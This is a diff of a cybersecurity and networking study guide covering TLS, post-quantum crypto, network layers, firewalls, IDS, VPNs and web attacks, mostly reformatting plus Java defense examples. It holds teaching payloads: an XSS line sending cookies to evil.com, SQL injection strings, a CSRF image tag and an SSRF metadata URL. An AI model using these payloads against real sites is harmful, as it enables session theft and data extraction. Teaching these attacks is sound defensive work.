+    MessageDigest sha256 = MessageDigest.getInstance("SHA-256");
+    byte[] digest = sha256.digest(spkiDer);
+    // Base64 encode and compare
+    String pin = "sha256//" + Base64.getEncoder().encodeToString(digest);
+    return MessageDigest.isEqual(pin.getBytes(), PINNED_SPKI_HASH.getBytes());
+}
+// Use with custom TrustManager in SSLContext for Android/Java HTTPS clients
 ```
 
 ---
@@ -2478,19 +2516,16 @@ When a TLS client receives a certificate:
 ### Certificate Revocation
 
 **CRL (Certificate Revocation List):**
-
 - CA publishes a signed list of revoked serial numbers
 - Clients download and check the CRL
 - Problem: CRLs can be large, become stale between updates
 
 **OCSP (Online Certificate Status Protocol):**
-
 - Client queries OCSP responder: "Is serial number X still valid?"
 - Real-time check
 - Problem: Privacy (CA learns which sites you visit), latency, OCSP responder may be down
 
 **OCSP Stapling:**
-
 - Server fetches OCSP response from CA and "staples" it to the TLS handshake
 - Client gets signed OCSP response from server — no need to contact CA
 - Best of both worlds: real-time, private, low latency
@@ -2500,7 +2535,6 @@ When a TLS client receives a certificate:
 Certificate Transparency (RFC 6962) requires all publicly trusted CAs to log every certificate they issue to public, auditable logs. Browsers reject certificates not in CT logs.
 
 **Benefits:**
-
 - Detects unauthorized certificates (e.g., a rogue CA issuing for google.com)
 - Historic record of all certificates ever issued
 - Domain owners can monitor for unauthorized certs
@@ -2528,7 +2562,6 @@ Certificate Transparency (RFC 6962) requires all publicly trusted CAs to log eve
 A **Zero-Knowledge Proof** allows a prover to convince a verifier that they know a secret, without revealing the secret itself.
 
 **Example: Cave of Ali Baba (Peggy & Victor)**
-
 ```
                     ────────
                    │        │
@@ -2557,7 +2590,6 @@ This is **interactive ZKP**: Peggy proves knowledge of the magic word without re
 In practice, proofs must be non-interactive (single message). This is achieved via the **Fiat-Shamir transformation**: replace the verifier's random challenges with H(transcript) — the hash serves as a random oracle.
 
 **Applications:**
-
 - **zk-SNARKs** (zero-knowledge succinct non-interactive arguments of knowledge) — used in privacy-preserving blockchains (Zcash)
 - **zk-STARKs** — transparent (no trusted setup), post-quantum
 - **FIDO2/WebAuthn** — password-less authentication using ZKP-like schemes
@@ -2570,7 +2602,6 @@ MPC allows multiple parties to jointly compute a function over their private inp
 **Millionaires Problem (Yao):** Alice and Bob each know their salary. They want to know who earns more, without revealing the actual salary.
 
 **Applications:**
-
 - Private set intersection (two companies check for common customers without revealing their full lists)
 - Threshold key management (3-of-5 parties must cooperate to sign a transaction)
 - Secure auctions (winning bid revealed, all losing bids stay private)
@@ -2588,7 +2619,6 @@ Enc(a) × Enc(b) = Enc(a × b)   (multiplicative homomorphism)
 **Fully Homomorphic Encryption (FHE)** supports both operations — enabling arbitrary computation on encrypted data. The server never sees the plaintext.
 
 **Applications:**
-
 - Cloud computing on private data (medical, financial)
 - Private information retrieval (query a database without revealing what you're looking for)
 
@@ -2609,27 +2639,23 @@ As of 2024, quantum computers with enough qubits to break current cryptography d
 NIST finalized post-quantum standards in 2024 (FIPS 203, 204, 205):
 
 **CRYSTALS-Kyber (ML-KEM, FIPS 203):**
-
 - Key Encapsulation Mechanism
 - Based on Module Learning With Errors (MLWE)
 - Replacing ECDH for key exchange
 - Key sizes: ~800-1568 bytes (vs 32 bytes for X25519)
 
 **CRYSTALS-Dilithium (ML-DSA, FIPS 204):**
-
 - Digital signature scheme
 - Based on MLWE and Module Short Integer Solution
 - Replacing ECDSA/Ed25519 for signatures
 - Signature size: ~2420-4595 bytes (vs 64 bytes for Ed25519)
 
 **SPHINCS+ (SLH-DSA, FIPS 205):**
-
 - Hash-based signature scheme
 - Conservative: security based only on hash function security
 - Larger signatures but very well-understood security
 
 **Migration strategy:**
-
 1. **Hybrid schemes**: TLS_ECDHE_kyber768 (combine classical + PQ for both)
 2. Inventory all cryptographic assets
 3. Update cryptographic agility (ability to swap algorithms)
@@ -2648,7 +2674,6 @@ NIST finalized post-quantum standards in 2024 (FIPS 203, 204, 205):
 ## 18.1 Why Layered Models?
 
 Networks are complex. A layered model breaks this complexity into manageable pieces where each layer:
-
 - Provides services to the layer above
 - Uses services from the layer below
 - Communicates with its peer layer on the other host via a protocol
@@ -2670,7 +2695,6 @@ Networks are complex. A layered model breaks this complexity into manageable pie
 **Memory aid:** "All People Seem To Need Data Processing" (top to bottom) or "Please Do Not Throw Sausage Pizza Away" (bottom to top).
 
 **Data encapsulation** (sending side):
-
 ```
 Application data
   → Segment (L4 adds TCP/UDP header)
@@ -2701,7 +2725,6 @@ The real internet uses the TCP/IP model (also called the Internet model):
 The physical layer transmits raw bits over a medium:
 
 **Transmission media:**
-
 - **Copper (twisted pair)**: Cat5e (1Gbps), Cat6 (10Gbps), Cat8 (25-40Gbps)
 - **Coaxial cable**: TV, some WAN links
 - **Fiber optic**: Gigabit to 400Gbps+, immune to EMI, long distances
@@ -2723,7 +2746,6 @@ Ethernet is the dominant wired LAN technology.
 ```
 
 **MAC Address:** 48-bit hardware address, e.g., `AA:BB:CC:DD:EE:FF`
-
 - First 3 bytes: OUI (Organizationally Unique Identifier — the vendor)
 - Last 3 bytes: Device-specific
 - `FF:FF:FF:FF:FF:FF` = broadcast
@@ -2734,7 +2756,6 @@ Ethernet is the dominant wired LAN technology.
 ## 19.3 Switching and MAC Tables
 
 A **Layer 2 switch** forwards frames based on MAC addresses:
-
 - Maintains a **CAM table** (MAC → port mapping)
 - Learns by watching source MACs of incoming frames
 - Forwards unknown destinations to all ports (flooding)
@@ -2791,7 +2812,6 @@ IPv4 uses 32-bit addresses: four octets in dotted decimal notation (e.g., `192.1
 ```
 
 **Key fields:**
-
 - **TTL** (Time to Live): Decremented at each router. Packet discarded at 0. Prevents infinite loops.
 - **Protocol**: 6=TCP, 17=UDP, 1=ICMP, 89=OSPF
 - **Fragmentation**: Large packets can be fragmented at routers (IP MTU)
@@ -2820,7 +2840,6 @@ Hosts:     192.168.1.1 – 192.168.1.254 (254 hosts)
 ```
 
 **Private IP ranges (RFC 1918):**
-
 ```
 10.0.0.0/8         → 16.7 million addresses
 172.16.0.0/12      → 1 million addresses
@@ -2837,23 +2856,24 @@ Internal         NAT Table              External
 192.168.1.11:54322  →  203.0.113.5:54322  →  8.8.8.8:80
 ```
 
-Outgoing packets: source IP/port rewritten to public IP/port Return packets: destination IP/port rewritten back to internal
+Outgoing packets: source IP/port rewritten to public IP/port
+Return packets: destination IP/port rewritten back to internal
 
 ## 20.2 IPv6
 
-IPv6 addresses are 128 bits, written in hexadecimal groups: `2001:0db8:85a3:0000:0000:8a2e:0370:7334`
+IPv6 addresses are 128 bits, written in hexadecimal groups:
+`2001:0db8:85a3:0000:0000:8a2e:0370:7334`
 
-Leading zeros and consecutive all-zero groups can be compressed: `2001:db8:85a3::8a2e:370:7334`
+Leading zeros and consecutive all-zero groups can be compressed:
+`2001:db8:85a3::8a2e:370:7334`
 
 **IPv6 address types:**
-
 - Global unicast: `2000::/3` (publicly routable)
 - Link-local: `fe80::/10` (single link, not routed)
 - Loopback: `::1`
 - Multicast: `ff00::/8`
 
 **IPv6 improvements over IPv4:**
-
 - 340 undecillion addresses (end to end reachability without NAT)
 - IPSec support built-in
 - No broadcast (replaced with multicast)
@@ -2864,16 +2884,17 @@ Leading zeros and consecutive all-zero groups can be compressed: `2001:db8:85a3:
 
 ICMP (Internet Control Message Protocol) provides error messages and diagnostics:
 
-|Type|Code|Meaning|
-|---|---|---|
-|0|0|Echo Reply (ping response)|
-|3|0|Destination Network Unreachable|
-|3|1|Destination Host Unreachable|
-|3|3|Destination Port Unreachable|
-|8|0|Echo Request (ping)|
-|11|0|TTL Exceeded in Transit|
+| Type | Code | Meaning |
+|------|------|---------|
+| 0 | 0 | Echo Reply (ping response) |
+| 3 | 0 | Destination Network Unreachable |
+| 3 | 1 | Destination Host Unreachable |
+| 3 | 3 | Destination Port Unreachable |
+| 8 | 0 | Echo Request (ping) |
+| 11 | 0 | TTL Exceeded in Transit |
 
-**ping**: Sends ICMP Echo Requests, measures round-trip time **traceroute**: Sends packets with TTL=1, 2, 3... Each router that decrements TTL to 0 sends back ICMP TTL Exceeded, revealing its IP and RTT.
+**ping**: Sends ICMP Echo Requests, measures round-trip time
+**traceroute**: Sends packets with TTL=1, 2, 3... Each router that decrements TTL to 0 sends back ICMP TTL Exceeded, revealing its IP and RTT.
 
 ---
 
@@ -2922,7 +2943,6 @@ Client                              Server
 **Flow Control** (end-to-end): Receiver advertises window size — how many bytes it can accept.
 
 **Congestion Control** (network-wide):
-
 - **Slow Start**: Begin with small window (1 MSS), double each RTT until threshold
 - **Congestion Avoidance**: Increase by 1 MSS per RTT (additive increase)
 - **Fast Retransmit**: 3 duplicate ACKs → retransmit without waiting for timeout
@@ -2958,23 +2978,22 @@ Data...
 Port numbers (16-bit: 0-65535) identify applications on a host:
 
 **Well-known ports (0-1023):**
-
-|Port|Protocol|Service|
-|---|---|---|
-|20/21|TCP|FTP data/control|
-|22|TCP|SSH|
-|23|TCP|Telnet (insecure)|
-|25|TCP|SMTP|
-|53|TCP/UDP|DNS|
-|67/68|UDP|DHCP server/client|
-|80|TCP|HTTP|
-|110|TCP|POP3|
-|143|TCP|IMAP|
-|443|TCP|HTTPS|
-|465/587|TCP|SMTPS/Submission|
-|993|TCP|IMAPS|
-|3306|TCP|MySQL|
-|5432|TCP|PostgreSQL|
+| Port | Protocol | Service |
+|------|----------|---------|
+| 20/21 | TCP | FTP data/control |
+| 22 | TCP | SSH |
+| 23 | TCP | Telnet (insecure) |
+| 25 | TCP | SMTP |
+| 53 | TCP/UDP | DNS |
+| 67/68 | UDP | DHCP server/client |
+| 80 | TCP | HTTP |
+| 110 | TCP | POP3 |
+| 143 | TCP | IMAP |
+| 443 | TCP | HTTPS |
+| 465/587 | TCP | SMTPS/Submission |
+| 993 | TCP | IMAPS |
+| 3306 | TCP | MySQL |
+| 5432 | TCP | PostgreSQL |
 
 ---
 
@@ -2998,18 +3017,18 @@ DNS is the internet's phone book — translating human-readable names to IP addr
 
 **DNS Record Types:**
 
-|Type|Purpose|Example|
-|---|---|---|
-|A|IPv4 address|example.com → 93.184.216.34|
-|AAAA|IPv6 address|example.com → 2606:2800:220:1:248:1893:25c8:1946|
-|CNAME|Canonical name (alias)|www → example.com|
-|MX|Mail server|example.com → mail.example.com|
-|TXT|Text (SPF, DKIM, verification)|"v=spf1 include:gmail.com ~all"|
-|NS|Nameserver|example.com → ns1.example.com|
-|SOA|Start of Authority|zone metadata|
-|PTR|Reverse DNS|34.216.184.93.in-addr.arpa → example.com|
-|SRV|Service location|_http._tcp → server:port|
-|CAA|Certificate Authority Authorization|"0 issue letsencrypt.org"|
+| Type | Purpose | Example |
+|------|---------|---------|
+| A | IPv4 address | example.com → 93.184.216.34 |
+| AAAA | IPv6 address | example.com → 2606:2800:220:1:248:1893:25c8:1946 |
+| CNAME | Canonical name (alias) | www → example.com |
+| MX | Mail server | example.com → mail.example.com |
+| TXT | Text (SPF, DKIM, verification) | "v=spf1 include:gmail.com ~all" |
+| NS | Nameserver | example.com → ns1.example.com |
+| SOA | Start of Authority | zone metadata |
+| PTR | Reverse DNS | 34.216.184.93.in-addr.arpa → example.com |
+| SRV | Service location | _http._tcp → server:port |
+| CAA | Certificate Authority Authorization | "0 issue letsencrypt.org" |
 
 ### DNS Resolution Process
 
@@ -3039,7 +3058,6 @@ Browser queries:  www.example.com?
 ### HTTP Request/Response
 
 **Request:**
-
 ```
 GET /page.html HTTP/1.1
 Host: www.example.com
@@ -3050,7 +3068,6 @@ Connection: keep-alive
 ```
 
 **Response:**
-
 ```
 HTTP/1.1 200 OK
 Date: Mon, 1 Jan 2024 12:00:00 GMT
@@ -3065,27 +3082,27 @@ Strict-Transport-Security: max-age=31536000; includeSubDomains
 
 ### HTTP Methods
 
-|Method|Meaning|Idempotent|Safe|
-|---|---|---|---|
-|GET|Retrieve resource|✅|✅|
-|POST|Create resource|❌|❌|
-|PUT|Replace resource|✅|❌|
-|PATCH|Partial update|❌|❌|
-|DELETE|Delete resource|✅|❌|
-|HEAD|GET without body|✅|✅|
-|OPTIONS|List allowed methods|✅|✅|
+| Method | Meaning | Idempotent | Safe |
+|--------|---------|-----------|------|
+| GET | Retrieve resource | ✅ | ✅ |
+| POST | Create resource | ❌ | ❌ |
+| PUT | Replace resource | ✅ | ❌ |
+| PATCH | Partial update | ❌ | ❌ |
+| DELETE | Delete resource | ✅ | ❌ |
+| HEAD | GET without body | ✅ | ✅ |
+| OPTIONS | List allowed methods | ✅ | ✅ |
 
 ### Security-Relevant HTTP Headers
 
-|Header|Purpose|
-|---|---|
-|`Strict-Transport-Security`|Force HTTPS, prevent downgrade|
-|`Content-Security-Policy`|Restrict script sources, prevent XSS|
-|`X-Frame-Options`|Prevent clickjacking|
-|`X-Content-Type-Options: nosniff`|Prevent MIME sniffing|
-|`Referrer-Policy`|Control referrer information leakage|
-|`Permissions-Policy`|Restrict browser features (camera, mic)|
-|`Set-Cookie: HttpOnly; Secure; SameSite`|Cookie security flags|
+| Header | Purpose |
+|--------|---------|
+| `Strict-Transport-Security` | Force HTTPS, prevent downgrade |
+| `Content-Security-Policy` | Restrict script sources, prevent XSS |
+| `X-Frame-Options` | Prevent clickjacking |
+| `X-Content-Type-Options: nosniff` | Prevent MIME sniffing |
+| `Referrer-Policy` | Control referrer information leakage |
+| `Permissions-Policy` | Restrict browser features (camera, mic) |
+| `Set-Cookie: HttpOnly; Secure; SameSite` | Cookie security flags |
 
 ---
 
@@ -3107,14 +3124,12 @@ default via 192.168.1.1 dev eth0
 ## 23.2 Interior Routing Protocols
 
 **OSPF (Open Shortest Path First):**
-
 - Link-state protocol
 - Each router knows the complete topology
 - Dijkstra's algorithm finds shortest paths
 - Fast convergence, scalable within an Autonomous System (AS)
 
 **EIGRP (Enhanced Interior Gateway Routing Protocol):**
-
 - Cisco proprietary, distance-vector hybrid
 - DUAL algorithm for loop-free paths
 
@@ -3178,7 +3193,6 @@ Stateful firewalls automatically allow return traffic — no need for explicit r
 ### Application-Layer Firewall (Layer 7)
 
 Deep Packet Inspection (DPI) understands application protocols:
-
 - Detect SQL injection in HTTP requests
 - Block specific domains in DNS queries
 - Inspect TLS SNI for blocked domains
@@ -3212,7 +3226,6 @@ Internet
 A WAF sits in front of web applications and filters HTTP/HTTPS traffic:
 
 **Detects and blocks:**
-
 - SQL injection
 - XSS (Cross-Site Scripting)
 - Path traversal
@@ -3228,19 +3241,18 @@ A WAF sits in front of web applications and filters HTTP/HTTPS traffic:
 
 ## 25.1 IDS vs IPS
 
-|Feature|IDS (Intrusion Detection System)|IPS (Intrusion Prevention System)|
-|---|---|---|
-|Position|Out-of-band (passive tap)|Inline (in traffic path)|
-|Action|Alert only|Alert + block|
-|Risk|No false-positive impact|False positives block legitimate traffic|
-|Use case|Monitoring, forensics|Active defense|
+| Feature | IDS (Intrusion Detection System) | IPS (Intrusion Prevention System) |
+|---------|----------------------------------|-----------------------------------|
+| Position | Out-of-band (passive tap) | Inline (in traffic path) |
+| Action | Alert only | Alert + block |
+| Risk | No false-positive impact | False positives block legitimate traffic |
+| Use case | Monitoring, forensics | Active defense |
 
 ## 25.2 Detection Methods
 
 ### Signature-Based Detection
 
 Match traffic against known attack patterns:
-
 ```
 Snort Rule Example:
 alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS \
@@ -3250,22 +3262,22 @@ alert tcp $EXTERNAL_NET any -> $HTTP_SERVERS $HTTP_PORTS \
    classtype:web-application-attack; sid:1001; rev:1;)
 ```
 
-**Pros:** Low false positives on known attacks, fast **Cons:** Cannot detect 0-days, signatures must be updated constantly
+**Pros:** Low false positives on known attacks, fast
+**Cons:** Cannot detect 0-days, signatures must be updated constantly
 
 ### Anomaly-Based Detection
 
 Build a baseline of normal behavior; alert on deviations:
-
 - Statistical: flag traffic that's more than 3σ from mean
 - Machine learning: train on normal traffic, alert on anomalies
 - Protocol anomaly: RFC-compliant vs non-compliant packets
 
-**Pros:** Can detect unknown attacks **Cons:** High false positive rate, baseline drift
+**Pros:** Can detect unknown attacks
+**Cons:** High false positive rate, baseline drift
 
 ### Behavioral Analysis (UEBA)
 
 User and Entity Behavior Analytics — detect anomalous user behavior:
-
 - User logging in from a new country at 3am
 - Sudden large data download after years of normal usage
 - Privilege escalation attempts
@@ -3282,13 +3294,13 @@ Auth systems →              [SIEM]
 ```
 
 **Key capabilities:**
-
 - Real-time correlation across sources
 - Historical search and investigation
 - Compliance reporting (PCI-DSS, HIPAA, SOC2)
 - Threat hunting
 
-**Commercial:** Splunk, IBM QRadar, Microsoft Sentinel **Open-source:** Wazuh, OpenSearch (ELK stack), OSSIM
+**Commercial:** Splunk, IBM QRadar, Microsoft Sentinel
+**Open-source:** Wazuh, OpenSearch (ELK stack), OSSIM
 
 ---
 
@@ -3299,7 +3311,6 @@ Auth systems →              [SIEM]
 A **Virtual Private Network (VPN)** creates an encrypted tunnel over an untrusted network (the internet), making the remote endpoint appear locally connected.
 
 **Use cases:**
-
 - Remote access: employees connecting to corporate network
 - Site-to-site: connecting branch offices
 - Privacy: hiding traffic from ISP/surveillance
@@ -3308,23 +3319,19 @@ A **Virtual Private Network (VPN)** creates an encrypted tunnel over an untruste
 ## 26.2 IPSec
 
 IPSec operates at Layer 3 (IP), providing:
-
 - **Authentication Header (AH)**: Integrity and authentication, no encryption
 - **Encapsulating Security Payload (ESP)**: Encryption + optional authentication
 
 **Modes:**
-
 - **Transport mode**: Encrypts only the IP payload; original IP header preserved. Host-to-host.
 - **Tunnel mode**: Encrypts the entire IP packet + adds new IP header. Gateway-to-gateway.
 
 **IKE (Internet Key Exchange):**
-
 - **IKEv2** (current standard): Two-phase key negotiation
-    - Phase 1: Establish secure channel (DH + auth)
-    - Phase 2: Negotiate Security Associations (SAs) for data
+  - Phase 1: Establish secure channel (DH + auth)
+  - Phase 2: Negotiate Security Associations (SAs) for data
 
 **IPSec algorithms (modern, RFC 8221):**
-
 - Encryption: AES-GCM-128, AES-GCM-256, ChaCha20-Poly1305
 - PRF: HMAC-SHA256, HMAC-SHA384
 - DH: Groups 19 (P-256), 20 (P-384), 31 (Curve25519)
@@ -3336,7 +3343,6 @@ OpenVPN uses TLS for the control channel and custom UDP/TCP protocol for data. V
 ## 26.4 WireGuard
 
 WireGuard (2020) is a modern, minimal VPN:
-
 - **Cryptographically opinionated**: No cipher agility — uses Curve25519, ChaCha20-Poly1305, BLAKE2s, HKDF, SipHash24
 - **Only ~4,000 lines of code** (vs OpenVPN's ~100,000)
 - Roaming: endpoint IP changes transparently (great for mobile)
@@ -3362,14 +3368,14 @@ WireGuard is now built into the Linux kernel (5.6+). Used as the foundation for 
 
 ## 27.1 Wi-Fi Security Standards
 
-|Protocol|Year|Status|Weaknesses|
-|---|---|---|---|
-|WEP|1997|**Broken**|RC4 key reuse, 24-bit IV|
-|WPA|2003|**Broken**|TKIP RC4|
-|WPA2-Personal|2004|Acceptable|PMKID attack, dictionary attacks|
-|WPA2-Enterprise|2004|Secure|Proper use required|
-|WPA3-Personal|2018|Recommended|SAE (Dragonfly)|
-|WPA3-Enterprise|2018|Recommended|192-bit mode|
+| Protocol | Year | Status | Weaknesses |
+|----------|------|--------|-----------|
+| WEP | 1997 | **Broken** | RC4 key reuse, 24-bit IV |
+| WPA | 2003 | **Broken** | TKIP RC4 |
+| WPA2-Personal | 2004 | Acceptable | PMKID attack, dictionary attacks |
+| WPA2-Enterprise | 2004 | Secure | Proper use required |
+| WPA3-Personal | 2018 | Recommended | SAE (Dragonfly) |
+| WPA3-Enterprise | 2018 | Recommended | 192-bit mode |
 
 ### WEP — Why It Failed
 
@@ -3384,13 +3390,11 @@ WEP used RC4 with a 24-bit IV prepended to the key. With 2^24 = 16 million possi
 ### WPA3 — Improvements
 
 WPA3-Personal replaces the PSK (Pre-Shared Key) handshake with **SAE (Simultaneous Authentication of Equals / Dragonfly):**
-
 - Mutual authentication based on Diffie-Hellman
 - Forward secrecy: each session has unique session key
 - Offline dictionary attacks are infeasible (must interact with AP for each guess)
 
 WPA3-Enterprise (192-bit mode):
-
 - Mandatory GCMP-256 encryption
 - HMAC-SHA-384 authentication
 - ECDH/ECDSA with P-384
@@ -3413,7 +3417,6 @@ Supplicant       Authenticator         RADIUS Server
 ```
 
 **EAP Methods:**
-
 - **EAP-TLS**: Client and server both present certificates — most secure
 - **PEAP**: Only server cert required; client authenticates with password inside TLS tunnel
 - **EAP-TTLS**: Similar to PEAP, more flexible
@@ -3423,13 +3426,11 @@ Supplicant       Authenticator         RADIUS Server
 Bluetooth security modes and their vulnerabilities:
 
 **Classic Bluetooth attacks:**
-
 - **BlueSnarfing**: Unauthorized access to device data
 - **BlueBugging**: Remote control of device
 - **KNOB (Key Negotiation of Bluetooth)**: Forces short encryption key (1 byte), enables brute force
 
 **Bluetooth Low Energy (BLE) security:**
-
 - Pairing modes: Just Works (no auth), Passkey, OOB, Numeric Comparison
 - Encryption: AES-CCM-128
 - Privacy: Resolvable Private Addresses (RPA) prevent tracking
@@ -3441,34 +3442,30 @@ Bluetooth security modes and their vulnerabilities:
 ## 28.1 Reconnaissance
 
 ### Passive Reconnaissance
-
 - OSINT: Shodan, LinkedIn, WHOIS, Certificate Transparency logs
 - DNS enumeration: `dig`, zone transfers, subdomain brute-forcing
 - Google dorking: `site:example.com filetype:pdf`, `inurl:admin`
 
 ### Active Reconnaissance
-
 - Port scanning (nmap): `nmap -sS -sV -O -p 1-65535 target`
 - Service fingerprinting: banner grabbing, version detection
 - OS fingerprinting: TTL values, TCP window sizes, IP options
 
 **nmap scan types:**
-
-|Flag|Type|Notes|
-|---|---|---|
-|-sS|SYN scan|Stealth, doesn't complete handshake|
-|-sT|Connect scan|Full handshake, logged|
-|-sU|UDP scan|Slow, unreliable|
-|-sN|NULL scan|No flags set|
-|-sF|FIN scan|FIN flag only|
-|-sX|XMAS scan|FIN+PSH+URG flags|
+| Flag | Type | Notes |
+|------|------|-------|
+| -sS | SYN scan | Stealth, doesn't complete handshake |
+| -sT | Connect scan | Full handshake, logged |
+| -sU | UDP scan | Slow, unreliable |
+| -sN | NULL scan | No flags set |
+| -sF | FIN scan | FIN flag only |
+| -sX | XMAS scan | FIN+PSH+URG flags |
 
 ## 28.2 Man-in-the-Middle Attacks
 
 An attacker positions themselves between two parties:
 
 ### ARP Poisoning (Layer 2 MITM)
-
 ```
 Normal:   Alice → Switch → Bob
 MITM:     Alice → [Attacker] → Bob
@@ -3481,9 +3478,7 @@ Attacker sends:
 Tools: `arpspoof`, `ettercap`, `Bettercap`
 
 ### SSL Stripping
-
 Downgrades HTTPS to HTTP by intercepting redirects:
-
 1. Client sends `http://bank.com`
 2. Attacker intercepts, fetches `https://bank.com` themselves
 3. Attacker serves `http://bank.com` to victim (unencrypted!)
@@ -3494,24 +3489,20 @@ Downgrades HTTPS to HTTP by intercepting redirects:
 ## 28.3 Denial of Service (DoS) and DDoS
 
 **Volumetric attacks:** Overwhelm bandwidth
-
 - UDP flood: Send massive amounts of UDP packets
 - DNS amplification: Send small query, get large response (amplification factor up to 70×)
 - NTP amplification: monlist command returns up to 600 records (amplification 556×)
 
 **Protocol attacks:** Exploit protocol weaknesses
-
 - SYN flood: Send many SYN packets, exhaust server's connection table
 - Ping of Death: Oversized fragmented ICMP packets
 - Smurf: ICMP Echo to broadcast address with spoofed source
 
 **Application layer (Layer 7):**
-
 - HTTP flood: Legitimate-looking requests exhaust server resources
 - Slowloris: Open many connections, send incomplete headers — holds server connections open
 
 **Defense:**
-
 - Anycast routing + scrubbing centers (Cloudflare, Akamai)
 - Rate limiting (at multiple layers)
 - SYN cookies (stateless SYN flood defense)
@@ -3520,7 +3511,6 @@ Downgrades HTTPS to HTTP by intercepting redirects:
 ## 28.4 Port Scanning and Firewall Evasion
 
 Common evasion techniques:
-
 - **Fragmentation**: Split packets to evade pattern matching
 - **Timing**: Very slow scans to avoid threshold-based detection
 - **Decoys**: `-D` in nmap spoofs source IPs (real scan still included)
@@ -3551,10 +3541,12 @@ The OWASP Top 10 (2021) lists the most critical web application security risks:
 SQL injection is the most devastating web attack when successful.
 
 **Vulnerable code:**
-
-```python
-# NEVER DO THIS:
-query = "SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'"
+```java
+// NEVER DO THIS — vulnerable to SQL injection:
+String query = "SELECT * FROM users WHERE username='" + username
+             + "' AND password='" + password + "'";
+Statement stmt = conn.createStatement();
+ResultSet rs = stmt.executeQuery(query); // DANGEROUS
 ```
 
 **Attack payload:** `username = admin' OR '1'='1' --`
@@ -3565,26 +3557,32 @@ SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password='...'
 ```
 
 **Blind SQL injection:** When no error is returned, extract data character-by-character:
-
 ```sql
 ' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a' --
 -- If the response is different when true vs false, enumerate character by character
 ```
 
 **Defenses:**
+```java
+// ALWAYS use PreparedStatement (parameterized queries):
+String sql = "SELECT * FROM users WHERE username = ? AND password = ?";
+PreparedStatement ps = conn.prepareStatement(sql);
+ps.setString(1, username);
+ps.setString(2, password);
+ResultSet rs = ps.executeQuery(); // Safe — parameters never interpreted as SQL
 
-```python
-# ALWAYS use parameterized queries:
-cursor.execute("SELECT * FROM users WHERE username=? AND password=?", (username, password))
+// OR use an ORM (Hibernate / JPA):
+TypedQuery<User> q = em.createQuery(
+    "SELECT u FROM User u WHERE u.username = :uname AND u.password = :pwd", User.class);
+q.setParameter("uname", username);
+q.setParameter("pwd",   password);
+User user = q.getSingleResult();
 
-# OR use an ORM:
-User.objects.filter(username=username, password=password)
-
-# Additional layers:
-# - Input validation (whitelist)
-# - Least privilege database accounts
-# - WAF rules
-# - Error handling (never expose stack traces)
+// Additional layers:
+// - Input validation (whitelist with regex / Bean Validation @Pattern)
+// - Least privilege DB user (SELECT-only where possible, separate write user)
+// - WAF rules (ModSecurity CRS)
+// - Never expose stack traces in HTTP responses (use @ControllerAdvice in Spring)
 ```
 
 ## 29.3 Cross-Site Scripting (XSS)
@@ -3592,31 +3590,44 @@ User.objects.filter(username=username, password=password)
 XSS injects malicious scripts into web pages viewed by other users.
 
 **Reflected XSS:**
-
 ```
 URL: https://bank.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
 ```
-
 If the server reflects the parameter unsanitized, the browser executes it.
 
-**Stored XSS:** Malicious script stored in the database (e.g., in a comment), executed every time the page loads.
+**Stored XSS:**
+Malicious script stored in the database (e.g., in a comment), executed every time the page loads.
 
-**DOM-based XSS:** Client-side JavaScript reads URL parameters and inserts them into the DOM without sanitization.
+**DOM-based XSS:**
+Client-side JavaScript reads URL parameters and inserts them into the DOM without sanitization.
 
 **Impact:** Session theft, credential phishing, keylogging, malware distribution.
 
 **Defenses:**
+```java
+// HTML encode all output — using OWASP Java Encoder library (recommended)
+// Maven: org.owasp.encoder:encoder:1.2.3
+import org.owasp.encoder.Encode;
 
-```python
-# HTML encode all output:
-import html
-safe_output = html.escape(user_input)
+String safeOutput = Encode.forHtml(userInput);           // for HTML body content
+String safeAttr   = Encode.forHtmlAttribute(userInput);  // inside HTML attributes
+String safeJs     = Encode.forJavaScript(userInput);     // inside <script> blocks
+String safeUrl    = Encode.forUriComponent(userInput);   // in URL parameters
 
-# Content Security Policy header:
-Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com
+// OR using Spring's HtmlUtils (simpler, less complete):
+String safe = org.springframework.web.util.HtmlUtils.htmlEscape(userInput);
 
-# Cookie flags:
-Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict
+// Content Security Policy header (set in HTTP response or Spring Security config):
+// response.setHeader("Content-Security-Policy",
+//     "default-src 'self'; script-src 'self' https://cdn.example.com");
+
+// Cookie flags (Spring Security — recommended):
+// http.sessionManagement().sessionCreationPolicy(...)
+// Cookie set with: HttpOnly=true, Secure=true, SameSite=Strict
+// In Spring Boot application.properties:
+//   server.servlet.session.cookie.http-only=true
+//   server.servlet.session.cookie.secure=true
+//   server.servlet.session.cookie.same-site=strict
 ```
 
 ## 29.4 CSRF — Cross-Site Request Forgery
@@ -3624,7 +3635,6 @@ Set-Cookie: session=...; HttpOnly; Secure; SameSite=Strict
 A malicious page tricks the victim's browser into making authenticated requests to another site.
 
 **Example:**
-
 ```html
 <!-- On evil.com -->
 <img src="https://bank.com/transfer?to=attacker&amount=1000" style="display:none">
@@ -3632,7 +3642,6 @@ A malicious page tricks the victim's browser into making authenticated requests 
 ```
 
 **Defenses:**
-
 - **CSRF tokens**: Include unpredictable token in forms, verify server-side
 - **SameSite cookies**: `SameSite=Lax` or `SameSite=Strict` prevents cross-site requests from including cookies
 - **Double Submit Cookie**: Include CSRF token in both cookie and form field
@@ -3641,18 +3650,15 @@ A malicious page tricks the victim's browser into making authenticated requests 
 ## 29.5 Authentication Attacks
 
 ### Brute Force
-
 - Rate limiting: lock after N failed attempts
 - CAPTCHA
 - Progressive delays (exponential backoff)
 
 ### Credential Stuffing
-
 - Use breached username/password lists from other sites
 - Defense: MFA, breach credential checking (Have I Been Pwned? API)
 
 ### Password Spraying
-
 - Try one common password against many usernames
 - Avoids lockout thresholds
 - Defense: Unusual hours detection, MFA, Azure Smart Lockout
@@ -3668,7 +3674,6 @@ Attack:             https://api.example.com/fetch?url=http://169.254.169.254/lat
 ```
 
 **Defense:**
-
 - Validate and whitelist allowed URLs
 - Resolve hostname to IP, check against blocklist (private IP ranges, localhost)
 - Use dedicated egress proxy with allowlist
@@ -3694,7 +3699,6 @@ Attack:             https://api.example.com/fetch?url=http://169.254.169.254/lat
 ```
 
 ### Phase 1: Preparation
-
 - Incident response plan (IRP) documented
 - SIEM and logging configured
 - IR team trained and on-call
